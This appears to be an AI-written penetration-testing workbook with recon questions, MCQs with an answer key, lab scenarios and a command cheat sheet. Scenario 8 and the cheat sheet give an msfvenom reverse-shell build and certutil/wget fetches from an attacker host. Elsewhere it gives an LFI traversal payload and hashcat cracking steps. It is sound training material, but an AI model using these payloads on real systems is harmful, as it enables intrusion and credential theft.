# Practical Ethical Hacking — Applied Exercises (Why/Who/What/How/When/Where/Which questions, MCQs, Scenarios)

Use these exercises to practice applying the concepts from the Practical Ethical Hacking transcription. Work through the wh-questions, try the MCQs (answer key provided), and complete the scenario-based tasks with evidence (screenshots, commands, notes). Where the task requires live data, substitute `<TARGET_IP>`, `<DOMAIN>`, `<USERNAME>`, `<WORDLIST>` etc.

---

## How to use this document
- Wh-questions: Reflect and answer in writing (good for interviews & debrief notes).
- MCQs: Test conceptual recall (answers at the end).
- Scenario-based tasks: Hands-on application; collect artifacts (commands, output, screenshots) and produce short findings/recommendations.
- Mini labs: Practical scripts to implement/modify.

---

# 1 — Wh-Questions (Why / Who / What / How / When / Where / Which)
Answer in full sentences. For practical wh-questions include short command examples and expected evidence.

## Recon & OSINT
1. **Why** is passive reconnaissance often performed before active scanning?  
2. **Who** in a client organization should you contact before starting active scanning? List at least three roles.
3. **What** types of public data produce the best high-value recon results (give three concrete examples and a short explanation why each is useful).
4. **How** would you validate that a domain `example.com` belongs to your client using only public resources? (commands / websites to check)
5. **When** should you stop passive OSINT and start active enumeration?
6. **Where** would you record discovered email formats and subdomain lists in your notes? Provide a short data model (fields).
7. **Which** breach-data sources would you query to find reused credentials? (name three and briefly explain what you’d search for)

## Networking & Scanning
8. **Why** is NAT important for IPv4 scarcity and how does it affect penetration testing from the outside?
9. **Who** is responsible for interpreting OSI layer problems in a client meeting — the pentester or the network team? How should a pentester present a Layer 2 finding?
10. **What** is the purpose of `nmap -T4 -p- -A <ip>` and what are the risks of running it against a production host?
11. **How** does a TCP SYN scan (`-sS`) differ in network traffic from a full TCP connection, and why is that historically considered “stealthy”?
12. **When** would you scan UDP ports in an assessment? What practical problem do you face when scanning UDP?
13. **Where** would you record the list of discovered open ports and matching services for a report? Provide an example line (IP + port + service + evidence reference).
14. **Which** `nmap` flags would you use to find service versions and OS fingerprinting? Give the exact flag names.

## Web Apps & Burp
15. **Why** should you check for default web pages before running deep scans or exploits?
16. **Who** should be told if your web vulnerability scan indicates a critical RCE on a production site, and how (short alert style)?
17. **What** does the presence of `Server: Apache/1.3.20` in an HTTP header tell you and what is your next step?
18. **How** do you use Burp Intruder to detect credential-stuffing opportunities? List positions and a short grep strategy to detect successful logins.
19. **When** do you prefer `ffuf` over `dirb`? Give one scenario.
20. **Where** could certificate-transparency logs (crt.sh) yield subdomains that other tools miss?
21. **Which** HTTP response properties do you monitor in intruder results to spot successful logins? Name two and explain.

## Exploitation, Payloads & Shells
22. **Why** might an exploit work with one payload but fail with another (staged vs non-staged)?
23. **Who** is liable if you accidentally exploit a live production server without explicit permission?
24. **What** are the operational differences between a reverse shell and a bind shell? Provide one advantage of each.
25. **How** can you change a shell from a killed or unstable connection into a fully interactive TTY?
26. **When** is it safer to avoid running destructive exploits (give two operational signs)?
27. **Where** would you store acquired hashes and how would you protect them while working on cracking (short security plan)?
28. **Which** method is generally faster for cracking large numbers of passwords: CPU cracking with hashcat on CPU or GPU cracking on a proper GPU? Explain.

## Post‑Exploitation & Privilege Escalation
29. **Why** is privilege escalation testing often more important than the initial exploit for impact?
30. **Who** on the client team should get immediate notification if you can escalate to domain admin / high‑privilege accounts?
31. **What** are three quick Linux checks you perform immediately after a low-priv shell becomes available (commands and purpose)?
32. **How** does an unquoted service path on Windows lead to privilege escalation? Write the short exploit pattern.
33. **When** is it acceptable to create a persistence mechanism during an authorized test?
34. **Where** in your notes do you document the exact command that gave you root/SYSTEM, and what metadata do you include?
35. **Which** automated scripts should you run first for local enumeration on Linux and Windows? (name two)

---

# 2 — Multiple Choice Questions (MCQs)

Answer each question and then check the answer key at the end.

1. Which of these is a private IPv4 address range?
   - A. 203.0.113.0/24  
   - B. 10.0.0.0/8  
   - C. 198.51.100.0/24  
   - D. 8.8.8.0/24

2. The TCP three-way handshake sequence is:
   - A. SYN, ACK, SYN  
   - B. SYN, FIN, ACK  
   - C. SYN, SYN-ACK, ACK  
   - D. ACK, SYN, FIN

3. A reverse shell is:
   - A. A connection where the attacker listens and target connects back  
   - B. A connection where the attacker binds and target listens  
   - C. A shell that reverses the user’s privileges  
   - D. A shell used for reversing code

4. If `nmap -sS` returns a SYN/ACK and you respond with RST, what happened?
   - A. Full TCP connection was established  
   - B. The port is closed  
   - C. The scanner saw an open port but didn’t complete the TCP handshake  
   - D. The host is filtered

5. Which tool is best for discovering subdomains using certificate logs?
   - A. ffuf  
   - B. crt.sh  
   - C. hydra  
   - D. netdiscover

6. Which of the following is a typical sign of a poorly-maintained web server?
   - A. Strict CSP headers present  
   - B. Default “It works” Apache test page visible  
   - C. Up-to-date TLS configuration  
   - D. Subdomain isolation by DNS

7. SUID bit on a Linux binary means:
   - A. The file is signed by the owner  
   - B. The file will run as the file's owner (possibly root) when executed  
   - C. That file can never be executed by non-root users  
   - D. The file is read-only

8. Credential stuffing attack relies principally on:
   - A. Brute forcing a single account with many passwords  
   - B. Using known valid username/password pairs from breaches  
   - C. Social engineering via phone calls  
   - D. Exploiting unquoted service paths

9. A “staged” payload in Metasploit:
   - A. Sends the entire payload in a single packet  
   - B. Sends a small initial payload that downloads the remainder later  
   - C. Is always undetectable by IDS  
   - D. Is only for Windows hosts

10. Which of these best describes `ffuf`?
    - A. A GUI vulnerability scanner  
    - B. A directory and content discovery tool (fuzzer)  
    - C. A password cracking tool  
    - D. A DNS brute force engine

11. Which command converts an MD5 hash cracking mode for `hashcat`?
    - A. `-m 1000`  
    - B. `-m 0`  
    - C. `-m 100`  
    - D. `-m 5000`

12. What is a safe first step before running a destructive exploit in a lab environment?
    - A. Run it directly in production to test reality  
    - B. Make a VM snapshot or backup (and record baseline)  
    - C. Scan the internet for other victims  
    - D. Disable logging on the target

---

## 3 — MCQ Answer Key
1. **B**  
2. **C**  
3. **A**  
4. **C**  
5. **B**  
6. **B**  
7. **B**  
8. **B**  
9. **B**  
10. **B**  
11. **B** (MD5 = mode 0)  
12. **B**

---

# 4 — Scenario-based Applied Tasks

Each scenario: objectives, required evidence, hints, and scoring suggestions. For assessments, collect commands, outputs, and 2–4 screenshots.

---

## Scenario 1 — External Recon & Subdomain Enumeration (OSINT → low-effort exploit path)
**Objective:** Using only passive public data, build a prioritized target list for a hypothetical external pentest against `examplecorp.com`. Provide 5 candidate subdomains and 10 candidate usernames to use later in password-spraying. Explain why each target is prioritized.

**Tasks:**
- Use `crt.sh`, `Hunter.io`, `phonebook.cz`, and GitHub search to gather:
  - Subdomain candidates (e.g., `dev.examplecorp.com`, `staging.examplecorp.com`) — list the top 5.
  - Email patterns and 10 candidate employee emails (realistic formats).
- Produce:
  - A 1-page note showing your method, the queries you used, and findings.
  - For each candidate subdomain: *Why* it is high priority (staging/dev/test vs production admin).

**Required Evidence:**
- `crt.sh` results screenshot for one subdomain.
- `hunter.io` screenshot showing an email pattern.
- A 1-page notes file (Markdown) listing top 5 subdomains + top 10 candidate emails and rationale.

**Hints:**
- Look for `-dev`, `-staging`, `-test`, `-backup`, `admin`.
- Prioritize subdomains that appear in certificate logs or on GitHub repos.

**Scoring (self-check):**
- 5/5 subdomains plausibly scoped → 2 points each.
- 10 usernames with at least 2 different formats → 10 points.
- Method + screenshots documented → 10 points.

---

## Scenario 2 — Scanning & Safe Enumeration
**Objective:** Run safe, logged `nmap` scans against the lab VM and produce initial findings. Identify two open services, version info, and one low-risk information disclosure.

**Tasks:**
- Use `netdiscover` or `arp-scan` to find target IP on your lab NAT.
- Run a staged approach:
  1. `nmap -sS -T4 -p- <ip>` (fast port sweep)
  2. `nmap -sV -p <open-ports> <ip>` (versions)
- Run `nikto` or `whatweb` against the web page found.
- Produce a short reconnaissance table with columns:
  - `IP`, `Port`, `Service`, `Version`, `Evidence_File` (screenshot filename)

**Required Evidence:**
- `nmap` command & output (text file).
- Screenshot of web page headers showing server banner.
- Small `notes.md` table with evidence links.

**Hints:**
- Keep scans short and non-disruptive for shared labs (`-T4`, limit scripts).
- Save `nmap` with `-oN initial-scan.txt`.

**Scoring:**
- Correct IP & ports found → 6 points.
- Version identification correct → 4 points.
- One info disclosure (e.g., server banner) documented → 5 points.

---

## Scenario 3 — Web Directory Fuzz & LFI discovery
**Objective:** On a target web app, find a directory and use a Local File Inclusion (LFI) to view `/etc/passwd` or an application config (safe lab only).

**Tasks:**
- Use `ffuf` or `dirb` to find actionable directories.
- If a directory takes parameters (e.g., `index.php?page=`), test an LFI payload like:
  - `?page=../../../../etc/passwd`
- If LFI works and shows `/etc/passwd`, document command and disallowed caveats:
  - If `/etc/shadow` is not readable, **do not** attempt to disclose actual password hashes on public screens — show the file length or proof line counts only.
- Deliverable: short report describing:
  - Steps, tool commands, payload used.
  - Evidence: one screenshot of `etc/passwd` partially (first 3 lines only) plus command history lines.

**Required Evidence:**
- `ffuf` command and output (live) showing the discovered path.
- Screenshot of LFI output (masked if sensitive).
- `notes.md` explaining the security impact & remediation.

**Hints:**
- Be careful: if target is production, do not run LFI exploits. Use only lab with permission.
- Use `-c` to colorize `ffuf` results.

**Scoring:**
- Found directory using `ffuf`/`dirb` → 6 points.
- Demonstrated LFI with correct traversal count → 6 points.
- Remediation writeup (filter input + whitelist) → 8 points.

---

## Scenario 4 — Credential Stuffing & Detection
**Objective:** Using a local test web login (lab only), execute a controlled credential-stuffing attempt using Burp Intruder and create a detection rule that would alert on successful logins.

**Tasks:**
1. Set up Burp and `FoxyProxy`, intercept a login attempt for the lab app.
2. Configure Intruder:
   - Mark username and password positions.
   - Use **Pitchfork** or **Cluster Bomb** with a small list of 10 username/password pairs (some valid, most invalid).
3. Run the attack and identify any response changes that indicate success.
4. Create a hypothetical detection rule (pseudo-Sigma or simple log rule) that would alert when a credential stuffing attempt succeeds (e.g., multiple different IPs with many login failures, or successful login after many failures).

**Required Evidence:**
- Screenshot of Burp Intruder positions and result page (highlight the successful row).
- The pseudocode or Sigma-like rule example (1–6 lines).

**Hints:**
- Monitor response size and `Set-Cookie` headers.
- Successful login often sets a session cookie or returns a different redirect.

**Scoring:**
- Intruder configured correctly → 8 points.
- Successful indicator identified and documented → 8 points.
- Detection rule plausible and readable → 4 points.

---

## Scenario 5 — Build a Bash Ping Sweeper (Implementation Task)
**Objective:** Implement the ping sweeper described in the transcription.

**Tasks:**
- Create `ipsweep.sh` with the behavior:
  - Usage: `./ipsweep.sh 192.168.4`
  - Pings `.1` through `.254`.
  - For each IP, `ping -c 1 <addr>` and extract the IP if alive.
  - Uses background jobs (`&`) to speed up scanning.
  - Output list of live IPs to `ips.txt`.
- Provide sample output showing at least one live host.

**Starter Script (fill & run):**
```bash
#!/bin/bash
# ipsweep.sh example
if [ -z "$1" ]; then
  echo "Usage: ./ipsweep.sh <base-ip>  # e.g. ./ipsweep.sh 192.168.4"
  exit 1
fi

for i in $(seq 1 254); do
  ping -c 1 ${1}.${i} | grep "64 bytes" | cut -d " " -f 4 | tr -d ":" &
done
wait
```

**Required Evidence:**
- `ipsweep.sh` file saved and shown.
- `ips.txt` produced (show first lines).

**Hints:**
- Use `seq 1 254`.
- Ensure `wait` after background jobs to let all finish.

**Scoring:**
- Script runs without errors & produces `ips.txt` → 10 points.
- Uses background jobs appropriately → +5 points.

---

## Scenario 6 — Python Port Scanner (Implementation Task)
**Objective:** Write a small Python 3 script `portscan.py` that scans TCP ports on a given host for the top 100 most common ports and prints open ports.

**Starter Template:**
```python
#!/usr/bin/env python3
import socket
import sys

if len(sys.argv) != 2:
    print("Usage: python3 portscan.py <host>")
    sys.exit(1)

host = sys.argv[1]
ports = [22, 80, 443, 139, 445, 8080, 3306, 3389]  # start simple (replace with top-100)
open_ports = []

for port in ports:
    sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
    sock.settimeout(0.5)
    result = sock.connect_ex((host, port))
    if result == 0:
        open_ports.append(port)
    sock.close()

print("Open ports on", host, ":", open_ports)
```

**Tasks:**
- Expand `ports` to at least 50 commonly used ports.
- Run `python3 portscan.py <lab-ip>`.
- Save `output.txt` with the script output.

**Required Evidence:**
- `portscan.py` and `output.txt`.
- Short reflection: which ports were open and whether `nmap` results matched.

**Scoring:**
- Working script returning open ports → 10 points.
- Matches nmap sample for same host → +5 points.

---

## Scenario 7 — Privilege Escalation: Identify SUID Binary & Exploit It (Linux lab)
**Objective:** On a lab Linux VM, identify an SUID binary that can elevate privileges and use GTFOBins pattern to escalate to root.

**Tasks:**
- Use `find / -perm -4000 -type f 2>/dev/null` to list SUID binaries.
- Choose one binary that `gtfobins.github.io` lists as exploitable (e.g., `php`, `less`, `nmap`, `vim`, etc. — lab dependent).
- Use the GTFOBins technique (exact command from the site) to get a root shell.
- Produce a short note describing the command and why it works (capture `whoami` output as proof).

**Required Evidence:**
- Command used to find SUIDs.
- GTFOBins URL & copied command.
- Screenshot: `whoami` showing `root` and command used.

**Hints & Safety:**
- Only run on lab VM.
- If the SUID binary used is destructive, snapshot first.

**Scoring:**
- Found an SUID and escalated → 15 points.
- Clear documentation of commands and explanation → 5 points.

---

## Scenario 8 — Windows PrivEsc: Unquoted Service Path
**Objective:** On a Windows lab VM, enumerate services, find an unquoted service path, and exploit it by placing an executable in the path to get SYSTEM level.

**Tasks:**
- Enumerate services with `sc queryex type= service` or `wmic service get name,pathname,startmode`.
- Identify a service whose `ImagePath` has spaces and no surrounding quotes (e.g., `C:\Program Files (x86)\Vendor\bin.exe`).
- If you have write permission to a higher-level folder seen in the path (e.g., `C:\Program Files (x86)\Vendor\`), prepare a reverse shell EXE:
  - `msfvenom -p windows/x64/shell_reverse_tcp LHOST=<kali> LPORT=4444 -f exe -o Exploit.exe`
- Host with `python -m http.server` and `certutil` on victim to fetch it:
  - `certutil -urlcache -f http://<kali>/Exploit.exe Exploit.exe`
- Stop & start the service:
  - `sc stop <service>`
  - `sc start <service>`
- Collect `whoami` and confirm `NT AUTHORITY\SYSTEM`.

**Required Evidence:**
- Service enumeration output showing service path.
- Proof file present in path `dir`.
- Listener & captured SYSTEM shell screenshot.

**Scoring:**
- Found unquoted path → 6 points.
- Successful SYSTEM shell → 14 points.
- Explanation of why the technique works → 5 points.

---

## Scenario 9 — Purple Team Exercise (Detection)
**Objective:** Simulate a noisy attack (e.g., a 5-min credential stuffing attempt) and propose a detection rule to reliably catch it.

**Tasks:**
- Choose a small lab web app to target (lab only).
- Run a short Intruder session in Burp that simulates credential stuffing (30–50 combos).
- Then write a detection rule in plain English / pseudo‑Sigma that would detect that activity on the server / WAF logs / access logs. Include:
  - Log fields used (source IP, URI, useragent, response size, response status).
  - Thresholds (e.g., >10 failed logins for many different users from same source in 10 minutes).
- Document how you would tune to avoid false positives.

**Evidence Required:**
- Burp Intruder result showing patterns during the simulated attack.
- Your pseudo-detection rule and tuning notes (Markdown).

**Scoring:**
- Attack simulation executed and evidence saved → 10 points.
- Practical detection rule with tuning plan → 10 points.

---

## Scenario 10 — Final Capstone Mini-Project (Combine everything)
**Objective:** Combine recon, scanning, exploitation, and reporting on a single lab target. Produce a 2–3 page debrief/report and a 3–8 minute recorded walkthrough of the exploit you performed.

**Tasks:**
1. Recon: gather OSINT (subdomain, public emails).
2. Scan & Enum: run `nmap` and `ffuf` or `dirb`.
3. Exploit: exploit one vulnerability (web upload, unquoted service, SUID, etc.) to obtain a low shell and *then* escalate to root/SYSTEM.
4. Post: collect one sensitive artifact (a flag file or database config) and **remove** any files you created.
5. Reporting:
   - 2–3 page PDF:
     - Executive summary
     - Technical findings (screenshots & steps)
     - Impact
     - Remediation
   - Short recorded video (3–8 minutes) showing the exploit chain (no sensitive hostnames outside your lab).

**Required Evidence:**
- `nmap` output + `ffuf` output
- Exploit commands, outputs, and screenshot of `whoami` at root/SYSTEM
- The PDF report & video link or stored file.

**Scoring:**
- Successful exploit chain → 30 points.
- Clear evidence + screenshots → 20 points.
- Report clarity & remediation quality → 30 points.
- Video walkthrough (clear and reproducible) → 20 points.

---

# 5 — Quick Reference: Commands to remember (copyable)

```bash
# Host discovery
netdiscover -r 192.168.57.0/24
arp-scan -l

# Nmap quick
nmap -T4 -p- -A <TARGET_IP>   # full aggressive scan
nmap -sS -p1-1000 <TARGET_IP>  # faster initial sweep

# Directory busting (fast)
ffuf -w /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt -u http://<HOST>/FUZZ

# Burp quick toggle (FoxyProxy recommended)
# Intercept request -> Send to Intruder -> mark pos -> choose cluster-bomb -> payload sets -> start

# Download file to target (Linux)
# Host a file: python3 -m http.server 80
# On victim: wget http://<KALI>/file

# Netcat
nc -nvlp 4444   # listener
nc -nv <ip> <port>  # connect

# Hash cracking (md5 example)
hashcat -m 0 hashes.txt /usr/share/wordlists/rockyou.txt

# Windows fetch file
certutil.exe -urlcache -f http://<KALI>/file.exe file.exe

# SUID find (Linux)
find / -perm -4000 -type f 2>/dev/null

# PowerShell reverse (example to test templates)
# (use only in lab)
```

---

If you want, I will:
- Create a compact printable 1-page cheat sheet with the top 25 commands for reconnaissance, scanning, web testing, and post‑exploit enumeration.  
- Produce a short “Safe Exploit Preflight Checklist” (one‑page .md) you must run before any destructive exploit in a lab or client environment.  
- Create a set of 12 additional flashcards you can practice for interview prep.

Which one would you like next?